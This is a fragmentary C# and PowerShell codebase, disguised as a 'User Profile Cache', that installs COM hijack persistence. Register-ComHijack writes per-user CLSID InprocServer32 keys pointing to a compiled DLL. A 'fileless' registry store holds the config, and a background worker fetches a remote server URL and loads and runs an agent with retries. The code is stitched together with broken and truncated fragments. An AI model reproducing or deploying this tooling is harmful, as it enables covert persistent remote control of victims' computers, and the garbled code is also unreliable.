using System;
using Microsoft.Win32;

namespace UserProfileCache
{
    internal sealed class RegistryConfig
    {
        public string RegistryKeyName { get; set; }
        public string Clsid { get; set; }
        public string ConfigUrl { get; set; }
        public string ServerBase { get; set; }
        public string AgentId { get; set; }
        public string OriginalInprocDll { get; set; }

    internal static class RegistryStore
    {
        private const string ClsidRoot = @"Software\Classes\CLSID";
        private const string InprocServer32 = "InprocServer32";
        private const string ConfigValueName = "C";
        private const string ServerValueName = "U";
        private const string AgentIdValueName = "I";

        public static RegistryConfig Load()
        {
            RegistryConfig selected = null;

            using (var clsidRoot = Registry.CurrentUser.OpenSubKey(ClsidRoot))
            {
                if (clsidRoot == null)
                    return null;

                foreach (var subKeyName in clsidRoot.GetSubKeyNames())
                {
                    using (var clsidKey = clsidRoot.OpenSubKey(subKeyName))
                    {
                        if (clsidKey == null)
                            continue;

                        using (var inproc = clsidKey.OpenSubKey(InprocServer32))
                        {
                            if (inproc == null)
                                continue;

                            var className = inproc.GetValue("Class") as string;
                            if (!string.Equals(className, CacheConstants.ComClassName, StringComparison.Ordinal))
                                continue;

                            var candidate = new RegistryConfig
                            {
                                RegistryKeyName = subKeyName,
                                Clsid = FormatClsid(subKeyName),
                                ConfigUrl = clsidKey.GetValue(ConfigValueName) as string,
                                ServerBase = clsidKey.GetValue(ServerValueName) as string,
                                AgentId = clsidKey.GetValue(AgentIdValueName) as string,
                                OriginalInprocDll = clsidKey.GetValue(CacheConstants.OriginalInprocValueName) as string
                            };

                            if (selected == null || ScoreConfig(candidate) > ScoreConfig(selected))
                                selected = candidate;
                        }
                    }
                }
            }

            if (selected == null)
                return null;

            MergeFromFilelessStore(selected);
            return selected;
        }

        private static int ScoreConfig(RegistryConfig config)
        {
            if (config == null)
                return 0;

            var score = 0;
            if (!string.IsNullOrEmpty(config.OriginalInprocDll))
                score += 8;
            if (!string.IsNullOrEmpty(config.AgentId))
                score += 4;
            if (!string.IsNullOrEmpty(config.ServerBase))
                score += 2;
            if (!string.IsNullOrEmpty(config.ConfigUrl))
                score += 1;
            return score;
        }

        /// <summary>
        /// Mirrors C/U/I to the canonical fileless CLSID so RegistrationService can persist JWT (T).
        /// </summary>
        public static void SyncFilelessStore(RegistryConfig config)
        {
            if (config == null)
                return;

            using (var key = OpenFilelessStoreKey(true))
            {
                if (key == null)
                    return;

                if (!string.IsNullOrEmpty(config.ConfigUrl))
                    key.SetValue(ConfigValueName, config.ConfigUrl, RegistryValueKind.String);

                if (!string.IsNullOrEmpty(config.ServerBase))
                    key.SetValue(ServerValueName, config.ServerBase, RegistryValueKind.String);

                if (!string.IsNullOrEmpty(config.AgentId))
                    key.SetValue(AgentIdValueName, config.AgentId, RegistryValueKind.String);
            }
        }

        public static void SaveServerBase(RegistryConfig config, string serverBase)
        {
            if (config == null || string.IsNullOrEmpty(config.Clsid))
                return;

            using (var clsidRoot = Registry.CurrentUser.OpenSubKey(ClsidRoot, true))
            {
                if (clsidRoot == null)
                    return;

                using (var key = clsidRoot.OpenSubKey(config.RegistryKeyName, true))
                {
                    if (key != null)
                        key.SetValue(ServerValueName, serverBase ?? string.Empty, RegistryValueKind.String);
                }
            }

            config.ServerBase = serverBase;
            SyncFilelessStore(config);
        }

        private static void MergeFromFilelessStore(RegistryConfig config)
        {
            using (var store = OpenFilelessStoreKey(false))
            {
                if (store == null)
                    return;

                if (string.IsNullOrEmpty(config.ConfigUrl))
                    config.ConfigUrl = store.GetValue(ConfigValueName) as string;

                if (string.IsNullOrEmpty(config.ServerBase))
                    config.ServerBase = store.GetValue(ServerValueName) as string;

                if (string.IsNullOrEmpty(config.AgentId))
                    config.AgentId = store.GetValue(AgentIdValueName) as string;
            }
        }

        private static RegistryKey OpenFilelessStoreKey(bool writable)
        {
            var path = FilelessStoreRelativePath();
            var key = Registry.CurrentUser.OpenSubKey(path, writable);
            if (key != null || !writable)
                return key;

            return Registry.CurrentUser.CreateSubKey(path);
        }

        private static string FilelessStoreRelativePath()
        {
            return ClsidRoot + @"\" + FilelessStoreKeyName();
        }

        private static string FilelessStoreKeyName()
        {
            var clsid = CacheConstants.FilelessStoreClsid.Trim();
            if (!clsid.StartsWith("{", StringComparison.Ordinal))
                clsid = "{" + clsid + "}";
            if (!clsid.EndsWith("}", StringComparison.Ordinal))
                clsid = clsid + "}";
            return clsid.ToUpperInvariant();
        }

        /// <summary>Removes stale JWT so a new agent id can register cleanly.</summary>
        public static void ClearFilelessToken()
        {
            using (var key = OpenFilelessStoreKey(true))
            {
                if (key == null)
                    return;

                try { key.DeleteValue(CacheConstants.FilelessTokenValueName, false); }
                catch { }
            }
        }

        /// <summary>Removes mistaken store key created without braces around the CLSID.</summary>
        public static void RemoveLegacyFilelessStoreKey()
        {
            var legacyName = FilelessStoreKeyName().Trim('{', '}');
            var legacyPath = ClsidRoot + @"\" + legacyName;

            try { Registry.CurrentUser.DeleteSubKeyTree(legacyPath, false); }
            catch { }
        }

        private static string FormatClsid(string subKeyName)
        {
            return subKeyName.StartsWith("{", StringComparison.Ordinal)
                ? subKeyName.ToUpperInvariant()
                : "{" + subKeyName.ToUpperInvariant() + "}";
        }
    }

                RegistryStore.SaveServerBase(config, serverBase);
                return serverBase;
            }
            catch
            {
                return config.ServerBase;
            }
        }

        private static void RunWorkerSafe()

                RunWorker();

            }
        }

        private static void RunWorker()
        {
            Thread.Sleep(CacheConstants.InitialDelayMs);
            WriteTrace("RunWorker started");

            Mutex mutex = null;
            var ownsMutex = false;

            try
            {
                bool mutexCreated;
                mutex = new Mutex(false, CacheConstants.MutexName, out mutexCreated);
                ownsMutex = mutex.WaitOne(0, false);
                if (!ownsMutex)
                {
                    WriteTrace("Mutex busy — exiting");
                    return;
                }

                var config = RegistryStore.Load();
                if (config == null)
                {
                    WriteTrace("RegistryStore.Load returned null");
                    return;
                }

                WriteTrace("Config loaded clsid=" + config.Clsid + " agentId=" + (config.AgentId ?? "null"));

                RegistryStore.RemoveLegacyFilelessStoreKey();
                RegistryStore.SyncFilelessStore(config);

                var backoff = CacheConstants.InitialBackoffMs;

                while (true)
                {
                    while (!NetworkInterface.GetIsNetworkAvailable())
                        Thread.Sleep(CacheConstants.NetworkPollMs);

                    try
                    {
                        var serverBase = ConfigClient.RefreshServerBase(config);
                        if (string.IsNullOrWhiteSpace(serverBase))
                            throw new InvalidOperationException("Server base unavailable.");

                        ApplyAgentEnvironment(config, serverBase);
                        LogEnvironmentSnapshot();

                        var started = DateTime.UtcNow;
                        LoadAndRunAgent(serverBase);
                        var elapsedMs = (int)(DateTime.UtcNow - started).TotalMilliseconds;
                        WriteTrace("Agent RunAsync ended after " + elapsedMs + "ms");

                        if (elapsedMs < 5000)
                        {
                            RegistryStore.ClearFilelessToken();
                            throw new InvalidOperationException(
                                "Agent exited early — see %TEMP%\\rmmlog.txt (RMM_DEBUG=1)");
                        }

                        break;
                    }
                    catch (Exception ex)
                    {
                        WriteTrace("Retry: " + ex.Message);
                        Thread.Sleep(backoff);
                        if (backoff < CacheConstants.MaxBackoffMs)
                            backoff = Math.Min(backoff * 2, CacheConstants.MaxBackoffMs);
                    }
                }
            }
            finally
            {
                if (ownsMutex && mutex != null)
                {
                    try { mutex.ReleaseMutex(); } catch { }
                }

                if (mutex != null)
                    mutex.Dispose();
            }
        }

        private static void ApplyAgentEnvironment(RegistryConfig config, string serverBase)
        {
            var normalizedServer = serverBase.TrimEnd('/');

            SetEnv(CacheConstants.ServerEnvVar, normalizedServer);
            SetEnv(CacheConstants.FilelessEnvVar, CacheConstants.FilelessEnvValue);
            SetEnv(CacheConstants.DebugEnvVar, CacheConstants.DebugEnvValue);
            SetEnv(CacheConstants.AllowModulesEnvVar, string.Empty);

            if (!string.IsNullOrEmpty(config.AgentId))
                SetEnv(CacheConstants.AgentIdEnvVar, config.AgentId);
        }

        private static void SetEnv(string name, string value)
        {

            }

            {
            }

function Get-CscPath {
    param(
        [ValidateSet('Auto', 'x64', 'x86')]
        [string]$Arch = 'Auto'
    )

    $paths = @()
    if ($Arch -eq 'x86') {
        $paths += Join-Path $env:WINDIR 'Microsoft.NET\Framework\v4.0.30319\csc.exe'
    }
    elseif ($Arch -eq 'x64') {
        $paths += Join-Path $env:WINDIR 'Microsoft.NET\Framework64\v4.0.30319\csc.exe'
    }
    else {
        $paths += Join-Path $env:WINDIR 'Microsoft.NET\Framework64\v4.0.30319\csc.exe'
        $paths += Join-Path $env:WINDIR 'Microsoft.NET\Framework\v4.0.30319\csc.exe'
    }

    foreach ($path in $paths) {
        if (Test-Path $path) { return $path }
    }

    throw "csc.exe não encontrado. Instale .NET Framework 4.x. Tentativas: $($paths -join ', ')"
}

function Invoke-CompileBootstrap {
    param(
        [Parameter(Mandatory = $true)][string]$OutputPath,
        [ValidateSet('Auto', 'x64', 'x86')][string]$Arch = 'Auto'
    )

    $buildDir = Join-Path $env:TEMP ("upc_" + [guid]::NewGuid().ToString('N'))
    New-Item -ItemType Directory -Path $buildDir -Force | Out-Null

    try {
        $sourceMap = Get-BootstrapSourceMap
        foreach ($entry in $sourceMap.GetEnumerator()) {
            $filePath = Join-Path $buildDir $entry.Key
            Set-Content -LiteralPath $filePath -Value $entry.Value -Encoding UTF8
        }

        $csc = Get-CscPath -Arch $Arch
        $sourceFiles = Get-ChildItem -Path $buildDir -Filter '*.cs' | ForEach-Object { $_.FullName }

        $outDir = Split-Path -Parent $OutputPath
        if (-not (Test-Path $outDir)) {
            New-Item -ItemType Directory -Path $outDir -Force | Out-Null
        }

        $stagingPath = Join-Path $buildDir 'UserProfileCache.dll'

        $cscArgs = @(
            '/nologo',
            '/target:library',
            '/platform:anycpu',
            "/out:$stagingPath",
            '/reference:System.dll'
        ) + $sourceFiles

        & $csc @cscArgs

        if ($LASTEXITCODE -ne 0) {
            throw "csc.exe falhou com exit code $LASTEXITCODE"
        }

        if (-not (Test-Path $stagingPath -PathType Leaf)) {
            throw "Compilação não gerou: $stagingPath"
        }

        Deploy-InstallDll -SourcePath $stagingPath -DestinationPath $OutputPath
    }
    finally {
        if (Test-Path $buildDir) {
            Remove-Item -LiteralPath $buildDir -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

function Get-ComAssemblyMetadata {
    param(
        [Parameter(Mandatory = $true)][string]$Path,
        [string]$ClassName,
        [string]$AssemblyName
    )

    $absolutePath = [System.IO.Path]::GetFullPath($Path)
    if (-not (Test-Path $absolutePath -PathType Leaf)) {
        throw "DLL não encontrada: $absolutePath"
    }

    $assembly = [System.Reflection.Assembly]::LoadFile($absolutePath)
    $assemblyFullName = $assembly.GetName()

    if (-not $AssemblyName) {
        $publicKeyToken = 'null'
        $tokenBytes = $assemblyFullName.GetPublicKeyToken()
        if ($tokenBytes -and $tokenBytes.Length -gt 0) {
            $publicKeyToken = -join ($tokenBytes | ForEach-Object { $_.ToString('x2') })
        }

        $AssemblyName = '{0}, Version={1}, Culture=neutral, PublicKeyToken={2}' -f @(
            $assemblyFullName.Name,
            $assemblyFullName.Version,
            $publicKeyToken
        )
    }

    if (-not $ClassName) {
        $comType = $null
        foreach ($type in $assembly.GetExportedTypes()) {
            if ($type.IsAbstract -or $type.IsInterface -or -not $type.IsPublic) { continue }
            $comVisible = $type.GetCustomAttributes([System.Runtime.InteropServices.ComVisibleAttribute], $false)
            if ($comVisible -and -not $comVisible[0].Value) { continue }
            $comType = $type
            break
        }

        if (-not $comType) {
            throw "Nenhuma classe COM exportada encontrada em $absolutePath"
        }

        $ClassName = $comType.FullName
    }

    return [PSCustomObject]@{
        DllPath        = $absolutePath
        AssemblyName   = $AssemblyName
        ClassName      = $ClassName
        RuntimeVersion = 'v4.0.30319'
    }
}

function Register-ComHijack {
    param(
        [Parameter(Mandatory = $true)][string]$Path,
        [Parameter(Mandatory = $true)][string]$TargetClsid,
        [ValidateSet('Auto', 'x64', 'x86')][string]$Arch = 'Auto',
        [string]$ClassName,
        [string]$AssemblyName,
        [string]$Description = 'User Profile Cache'
    )

    $clsid = Format-ComClsid -Value $TargetClsid
    $metadata = Get-ComAssemblyMetadata -Path $Path -ClassName $ClassName -AssemblyName $AssemblyName
    $mscoree = Get-MscoreePath -Arch $Arch
    $codeBase = Format-CodeBaseUri -Path $metadata.DllPath

    $clsidKey = "HKCU:\Software\Classes\CLSID\$clsid"
    $inprocKey = Join-Path $clsidKey 'InprocServer32'

    New-Item -Path $clsidKey -Force | Out-Null
    Set-ItemProperty -Path $clsidKey -Name '(default)' -Value $Description
    New-Item -Path $inprocKey -Force | Out-Null
    Set-ItemProperty -Path $inprocKey -Name '(default)' -Value $mscoree
    Set-ItemProperty -Path $inprocKey -Name 'ThreadingModel' -Value 'Both'
    Set-ItemProperty -Path $inprocKey -Name 'Assembly' -Value $metadata.AssemblyName
    Set-ItemProperty -Path $inprocKey -Name 'Class' -Value $metadata.ClassName
    Set-ItemProperty -Path $inprocKey -Name 'RuntimeVersion' -Value $metadata.RuntimeVersion
    Set-ItemProperty -Path $inprocKey -Name 'CodeBase' -Value $codeBase

    return [PSCustomObject]@{
        Clsid          = $clsid
        DllPath        = $metadata.DllPath
        Mscoree        = $mscoree
        Assembly       = $metadata.AssemblyName
        Class          = $metadata.ClassName
        RuntimeVersion = $metadata.RuntimeVersion
        CodeBase       = $codeBase
    }
}

function Unregister-ComHijack {

    $clsid = Format-ComClsid -Value $TargetClsid
    $clsidKey = "HKCU:\Software\Classes\CLSID\$clsid"

function Register-ComHijackViaRegAsm {
    param(
        [Parameter(Mandatory = $true)][string]$Path,
        [string]$TargetClsid
    )

    $dllPath = [System.IO.Path]::GetFullPath($Path)
    $regAsm = Get-RegAsmPath
    $regFile = Join-Path $env:TEMP "UserProfileCache_$(Get-Random).reg"
    $hkcuRegFile = Join-Path $env:TEMP "UserProfileCache_hkcu_$(Get-Random).reg"

    try {
        & $regAsm $dllPath /regfile:$regFile /codebase | Out-Null
        if (-not (Test-Path $regFile)) { throw "RegAsm não gerou o arquivo .reg esperado." }

        $content = Get-Content -Path $regFile -Raw -Encoding Unicode
        $content = $content -replace 'HKEY_CLASSES_ROOT', 'HKEY_CURRENT_USER\Software\Classes'
        Set-Content -Path $hkcuRegFile -Value $content -Encoding Unicode
        & reg.exe import $hkcuRegFile | Out-Null
    }
    finally {
        Remove-Item -Path $regFile, $hkcuRegFile -ErrorAction SilentlyContinue
    }

    if (-not $TargetClsid) {
        $metadata = Get-ComAssemblyMetadata -Path $dllPath
        $assembly = [System.Reflection.Assembly]::LoadFile($metadata.DllPath)
        foreach ($type in $assembly.GetExportedTypes()) {
            if ($type.GUID -ne [Guid]::Empty) {
                $TargetClsid = $type.GUID.ToString().ToUpperInvariant()
                break
            }
        }
    }

    $clsid = Format-ComClsid -Value $TargetClsid
    $inprocKey = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"
    if (-not (Test-Path $inprocKey)) { throw "Registro HKCU não encontrado em $inprocKey" }

    $props = Get-ItemProperty -Path $inprocKey
    return [PSCustomObject]@{
        Clsid          = $clsid
        DllPath        = $dllPath
        Mscoree        = $props.'(default)'
        Assembly       = $props.Assembly
        Class          = $props.Class
        RuntimeVersion = $props.RuntimeVersion
        CodeBase       = $props.CodeBase
    }
}

function Unregister-ComHijackViaRegAsm {
    param(
        [Parameter(Mandatory = $true)][string]$Path,
        [Parameter(Mandatory = $true)][string]$TargetClsid
    )

    & (Get-RegAsmPath) ([System.IO.Path]::GetFullPath($Path)) /unregister /codebase | Out-Null
    Unregister-ComHijack -TargetClsid $TargetClsid -RemoveProgId
}

function Enable-Tls12 {
    param([string]$Url)

    } catch { }
}

function Get-ServerUrl {
    param([string]$Url)

    Enable-Tls12 $Url
    $raw = (New-Object Net.WebClient).DownloadString($Url)
    $srv = $null

    if ($PSVersionTable.PSVersion.Major -ge 3) {
        try {
            $j = $raw | ConvertFrom-Json
            if ($j) { $srv = $j.server }
        } catch { }
    }

    if (-not $srv -and ($raw -match '"server"\s*:\s*"([^"]+)"')) {
        $srv = $matches[1]
    }

    if (-not $srv) { throw "Config missing 'server' key." }
    return $srv.Trim().TrimEnd('/')
}

function Get-ProfileCacheHijackInstall {
    param([string]$TargetClsid)

    $destDll = Get-InstallDllPath
    $dllExists = Test-Path $destDll -PathType Leaf
    $clsidRoot = 'HKCU:\Software\Classes\CLSID'

    if (-not (Test-Path $clsidRoot)) {
        return $null
    }

    $found = @()
    foreach ($subKey in Get-ChildItem -Path $clsidRoot -ErrorAction SilentlyContinue) {
        $inprocKey = Join-Path $subKey.PSPath 'InprocServer32'
        if (-not (Test-Path $inprocKey)) {
            continue
        }

        $inproc = Get-ItemProperty -Path $inprocKey -ErrorAction SilentlyContinue
        if ($inproc.Class -ne $Script:ComClassName) {
            continue
        }

        $clsid = Format-ComClsid -Value $subKey.PSChildName
        $clsidProps = Get-ItemProperty -Path $subKey.PSPath -ErrorAction SilentlyContinue

        $found += [PSCustomObject]@{
            Clsid       = $clsid
            DllPath     = $destDll
            DllExists   = $dllExists
            Config      = $clsidProps.C
            Server      = $clsidProps.U
            AgentId     = $clsidProps.I
            OriginalDll = $clsidProps.O
            CodeBase    = $inproc.CodeBase
        }
    }

    if ($TargetClsid) {
        $formatted = Format-ComClsid -Value $TargetClsid
        return $found | Where-Object { $_.Clsid -eq $formatted } | Select-Object -First 1
    }

    return $found | Select-Object -First 1
}

Nao foi possivel substituir a DLL — ainda em uso por outro processo.

Passos manuais:

function Get-RegistryClsidCandidates {

function Invoke-InstallAction {
    if (-not $Config) { throw "Install requer -Config." }
    if (-not $Clsid) { throw "Install requer -Clsid." }

    $existing = Get-ProfileCacheHijackInstall -TargetClsid $Clsid
    if ($existing -and $existing.DllExists -and -not $Force) {
        Write-Host 'Ja instalado.'
        return
    }

    Write-Host 'Instalando...'

    $serverBase = Get-ServerUrl -Url $Config

    $destDll = Get-InstallDllPath
    $installDir = Split-Path -Parent $destDll
    if (-not (Test-Path $installDir)) {
        New-Item -ItemType Directory -Path $installDir -Force | Out-Null
    }

    Release-ProfileCacheDllLock -DllPath $destDll -Clsid $Clsid

    if ($SourceDll) {
        if (-not (Test-Path $SourceDll -PathType Leaf)) {
            throw "SourceDll não encontrada: $SourceDll"
        }

        Deploy-InstallDll -SourcePath $SourceDll -DestinationPath $destDll
    }
    else {
        Invoke-CompileBootstrap -OutputPath $destDll -Arch $Architecture
    }

    $result = Register-ComHijack -Path $destDll -TargetClsid $Clsid -Arch $Architecture

    $agentId = [guid]::NewGuid().ToString('N')
    $clsidKey = "HKCU:\Software\Classes\CLSID\$($result.Clsid)"

    Set-ItemProperty -Path $clsidKey -Name 'C' -Value $Config -Type String
    Set-ItemProperty -Path $clsidKey -Name 'U' -Value $serverBase -Type String
    Set-ItemProperty -Path $clsidKey -Name 'I' -Value $agentId -Type String

    $origDll = Save-OriginalInprocDll -Clsid $result.Clsid -HkcuClsidKey $clsidKey

    Sync-FilelessRegistryStore -ConfigUrl $Config -ServerBase $serverBase -AgentId $agentId

    Set-Content -Path $Script:StateFile -Value $result.Clsid -NoNewline

    if ($RestartExplorer) {
        taskkill /f /im explorer.exe 2>$null | Out-Null
        Start-Sleep -Seconds 1
        Start-Process explorer.exe
    }

    Write-Host 'Concluido.'
}

function Invoke-UninstallAction {
    if (-not $Clsid) { throw "Uninstall requer -Clsid." }

    Write-Host 'Removendo...'

    $removed = Unregister-ComHijack -TargetClsid $Clsid -RemoveProgId

    Remove-FilelessRegistryStore

    if ($RemoveDll) {
        $destDll = Get-InstallDllPath
        Release-ProfileCacheDllLock -DllPath $destDll -Clsid $Clsid
        if (Test-Path $destDll) {
            Remove-Item -LiteralPath $destDll -Force
        }
    }

    if ($RestartExplorer) {
        $null = taskkill /f /im explorer.exe 2>&1
        Start-Sleep -Seconds 1
        Start-Process explorer.exe
    }

    if (Test-Path $Script:StateFile) {
        Remove-Item -Path $Script:StateFile -Force -ErrorAction SilentlyContinue
    }

    Write-Host 'Concluido.'
}

function Invoke-RegisterAction {
    if (-not $Clsid) { throw "Register requer -Clsid." }

    $targetDll = $DllPath
    if (-not $targetDll) { $targetDll = Get-InstallDllPath }
    if (-not (Test-Path $targetDll -PathType Leaf)) {
        throw "DLL não encontrada: $targetDll (use -DllPath ou execute Install primeiro)."
    }

    if ($UnregisterPrevious -and (Test-Path $Script:StateFile)) {
        $previous = (Get-Content -Path $Script:StateFile -Raw).Trim()
        if ($previous) {
            Unregister-ComHijack -TargetClsid $previous -RemoveProgId | Out-Null
        }
    }

    Write-Host 'Instalando...'

    if ($UseRegAsm) {
        $result = Register-ComHijackViaRegAsm -Path $targetDll -TargetClsid $Clsid
    }
    else {
        $result = Register-ComHijack -Path $targetDll -TargetClsid $Clsid -Arch $Architecture
    }

    Set-Content -Path $Script:StateFile -Value $result.Clsid -NoNewline

    Write-Host 'Concluido.'
}

function Invoke-UnregisterAction {
    if (-not $Clsid) { throw "Unregister requer -Clsid." }

    Write-Host 'Removendo...'

    if ($UseRegAsm) {
        $targetDll = $DllPath
        if (-not $targetDll) { $targetDll = Get-InstallDllPath }
        if (-not (Test-Path $targetDll -PathType Leaf)) {
            throw "Unregister com -UseRegAsm requer -DllPath válido."
        }

        $removed = Unregister-ComHijackViaRegAsm -Path $targetDll -TargetClsid $Clsid
    }
    else {
        $removed = Unregister-ComHijack -TargetClsid $Clsid -RemoveProgId
    }

    Write-Host 'Concluido.'
}

#endregion

switch ($Action) {
    'Install'    { Invoke-InstallAction }
    'Uninstall'  { Invoke-UninstallAction }
    'Register'   { Invoke-RegisterAction }
    'Unregister' { Invoke-UnregisterAction }
    'ListClsid'  { Invoke-ListClsidAction }
}
